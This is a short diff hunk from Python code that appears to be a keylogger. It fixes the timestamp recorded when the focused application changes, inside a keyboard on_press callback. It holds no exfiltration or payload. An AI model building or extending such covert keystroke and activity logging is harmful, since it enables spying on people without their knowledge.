@@ -89,7 +89,8 @@ def on_press(key):
         pass
 
     if new_app != old_app and new_app != '':
-        logged_data.append( f'[{datetime}] ~ {new_app}\n' )
+        datetime2 = time.ctime( time.time() )
+        logged_data.append( f'[{datetime2}] ~ {new_app}\n' )
         old_app = new_app
     else:
         pass
